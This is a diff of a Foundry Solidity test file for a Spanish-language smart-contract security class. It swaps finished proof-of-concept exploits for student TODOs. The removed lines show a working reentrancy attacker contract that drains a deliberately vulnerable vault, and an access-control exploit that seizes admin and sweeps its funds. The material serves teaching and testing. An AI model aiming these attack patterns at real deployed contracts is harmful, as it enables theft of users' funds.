@@ -3,45 +3,42 @@ pragma solidity ^0.8.26;
 
 import "forge-std/Test.sol";
 import "../src/VaultVulnerable.sol";
-import "../src/Vault.sol";
 
 // ---------------------------------------------------------------------------
-// Contrato atacante — PoC de reentrancy
+// TALLER DE LA CLASE 7 — lo que falta lo escribis vos
 // ---------------------------------------------------------------------------
-// Deposita una cantidad pequena y, al recibir el ETH del primer withdraw,
-// vuelve a llamar a withdraw() desde receive() ANTES de que el vault descuente
-// el balance. Repite hasta drenar el vault.
+// Hay tres cosas sin terminar: el contrato atacante y los dos tests que
+// demuestran cada bug. Cada una tiene la consigna en su comentario.
+//
+// Los dos tests arrancan con `vm.skip(true)`, asi `forge test` los muestra como
+// [SKIP] y no como falla. Cuando escribas uno, borra esa linea.
+//
+// Las consignas completas estan en ethereum/README.md, "Taller de la Clase 7".
+
+// ---------------------------------------------------------------------------
+// El contrato atacante
+// ---------------------------------------------------------------------------
 contract ReentrancyAttacker {
     VaultVulnerable public vault;
-    uint256 public amountPerCall;
 
     constructor(VaultVulnerable _vault) {
         vault = _vault;
     }
 
-    // Lanza el ataque: deposita `amount` y empieza el ciclo de reentrancy.
+    // TODO: el ataque. Recibe ETH del que lo lanza (msg.value), lo deposita en
+    // el vault y dispara el robo.
     function attack() external payable {
-        amountPerCall = msg.value;
-        vault.deposit{value: msg.value}();
-        vault.withdraw();
     }
 
-    // Se dispara cada vez que el vault nos envia ETH. Mientras el vault tenga
-    // fondos para cubrir otro retiro, re-entramos.
+    // TODO: se ejecuta cada vez que el vault le envia ETH.
+    // Ojo con cuando parar: si la ultima llamada al vault revierte, el revert se
+    // propaga hacia arriba y deshace todo el ataque.
     receive() external payable {
-        if (address(vault).balance >= amountPerCall) {
-            vault.withdraw();
-        }
-    }
-
-    // Recoge el botin.
-    function loot(address payable to) external {
-        to.transfer(address(this).balance);
     }
 }
 
 // ---------------------------------------------------------------------------
-// PoC 1 — Reentrancy drena el vault
+// PoC 1 — el robo de fondos
 // ---------------------------------------------------------------------------
 contract VaultVulnerableReentrancyTest is Test {
     VaultVulnerable vault;
@@ -51,7 +48,7 @@ contract VaultVulnerableReentrancyTest is Test {
 
     function setUp() public {
         vault = new VaultVulnerable();
-        // Dos victimas inocentes depositan 5 ETH cada una: el vault tiene 10.
+        // Dos victimas depositan 5 ETH cada una: el vault tiene 10.
         vm.deal(victima1, 5 ether);
         vm.deal(victima2, 5 ether);
         vm.prank(victima1);
@@ -60,30 +57,17 @@ contract VaultVulnerableReentrancyTest is Test {
         vault.deposit{value: 5 ether}();
     }
 
+    // TODO: demostrar el robo. Con 1 ETH propio, `attackerOwner` lanza tu
+    // ReentrancyAttacker. Verificar con asserts cuanto ETH queda en el vault y
+    // cuanto tiene el atacante, y que el libro contable (`balanceOf`) sigue
+    // diciendo que las victimas tienen su saldo.
     function test_Reentrancy_DrenaElVault() public {
-        assertEq(address(vault).balance, 10 ether, "setup: el vault arranca con 10 ETH");
-
-        // El atacante invierte 1 ETH propio.
-        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
-        vm.deal(attackerOwner, 1 ether);
-
-        vm.prank(attackerOwner);
-        attacker.attack{value: 1 ether}();
-
-        // Resultado: el atacante invirtio 1 ETH y el vault quedo vacio.
-        // Robo los 10 ETH de las victimas (se llevo 11, puso 1).
-        assertEq(address(vault).balance, 0, "el vault quedo drenado");
-        assertEq(address(attacker).balance, 11 ether, "el atacante tiene 11 ETH (1 propio + 10 robados)");
-
-        // Las victimas siguen teniendo "balance" en el libro contable, pero
-        // el vault no tiene ETH para pagarles: insolvencia total.
-        assertEq(vault.balanceOf(victima1), 5 ether, "el libro dice que victima1 tiene 5...");
-        assertEq(vault.balanceOf(victima2), 5 ether, "...y victima2 tambien, pero no hay ETH");
+        vm.skip(true);   // borrar cuando lo escribas
     }
 }
 
 // ---------------------------------------------------------------------------
-// PoC 2 — Control de acceso roto: cualquiera se hace admin y barre
+// PoC 2 — el otro bug
 // ---------------------------------------------------------------------------
 contract VaultVulnerableAccessControlTest is Test {
     VaultVulnerable vault;
@@ -99,33 +83,21 @@ contract VaultVulnerableAccessControlTest is Test {
         vault.deposit{value: 8 ether}();
     }
 
-    function test_AccessControl_CualquieraSeHaceAdminYBarre() public {
-        assertEq(vault.admin(), deployer, "setup: admin es el deployer");
-        assertEq(address(vault).balance, 8 ether);
-
-        // El atacante se nombra admin (setAdmin no chequea nada).
-        vm.prank(atacante);
-        vault.setAdmin(atacante);
-        assertEq(vault.admin(), atacante, "el atacante usurpo el admin");
-
-        // Y ahora barre todo el ETH a su propia cuenta.
-        uint256 antes = atacante.balance;
-        vm.prank(atacante);
-        vault.sweep();
-
-        assertEq(address(vault).balance, 0, "el vault quedo vacio");
-        assertEq(atacante.balance, antes + 8 ether, "el atacante se llevo los 8 ETH de la victima");
+    // TODO: demostrar que `atacante`, que no es el admin, puede quedarse con
+    // los 8 ETH de la victima. Sin contrato atacante: alcanza con llamadas
+    // desde su cuenta (`vm.prank`).
+    function test_AccessControl_ExtranioSeQuedaConLosFondos() public {
+        vm.skip(true);   // borrar cuando lo escribas
     }
 }
 
 // ---------------------------------------------------------------------------
-// PoC 3 — El invariante de solvencia ATRAPA la reentrancy
+// PoC 3 — el invariante de solvencia
 // ---------------------------------------------------------------------------
-// Misma propiedad que VaultInvariant.t.sol (Clase 6), la solvencia, pero con
-// otro handler: ademas de depositar puede disparar al atacante. El fuzzer de
-// invariantes encuentra que el ETH del contrato puede quedar por debajo de lo
-// depositado legitimamente. Es assertGe y no assertEq porque el deposito del
-// atacante no se cuenta en `deposited`: un vault sano puede tener mas, nunca menos.
+// La misma propiedad de la Clase 6, la solvencia, con un handler que ademas de
+// depositar puede disparar TU atacante. Es assertGe y no assertEq porque el
+// deposito del atacante no se cuenta en `deposited`: un vault sano puede tener
+// mas, nunca menos.
 contract VulnerableHandler is Test {
     VaultVulnerable public vault;
     ReentrancyAttacker public attacker;
@@ -144,7 +116,7 @@ contract VulnerableHandler is Test {
         deposited += amount;
     }
 
-    // El atacante intenta drenar reentrando. Solo procede si hay fondos.
+    // El atacante intenta su ataque. Solo procede si hay fondos.
     function runAttack(uint256 seed) external {
         uint256 stake = bound(seed, 1 ether, 10 ether);
         if (address(vault).balance == 0) return;
@@ -165,15 +137,10 @@ contract VaultVulnerableInvariantTest is Test {
         targetContract(address(handler));
     }
 
-    /// @dev Este invariante FALLA contra el vault vulnerable: tras un ataque de
-    ///      reentrancy, el ETH del contrato es MENOR que la suma de los depositos
-    ///      legitimos registrados. Demuestra como el invariante detecta el bug
-    ///      sin que tengamos que escribir el PoC exacto a mano.
-    ///
-    ///      El assertGe esta comentado a proposito (con un assertTrue en su
-    ///      lugar) para que la suite de la clase pase en verde; descomentar en
-    ///      vivo para ver el shrinking de Foundry encontrando la secuencia minima
-    ///      que rompe la solvencia. Volver a comentarlo al terminar.
+    /// @dev El assertGe esta comentado (con un assertTrue en su lugar) para que
+    ///      la suite pase en verde. Cuando tu atacante funcione, descomentarlo y
+    ///      correr `forge test --match-contract VaultVulnerableInvariantTest -vv`.
+    ///      Volver a comentarlo al terminar.
     function invariant_solvency_DEMO() public view {
         // assertGe(
         //     address(vault).balance,
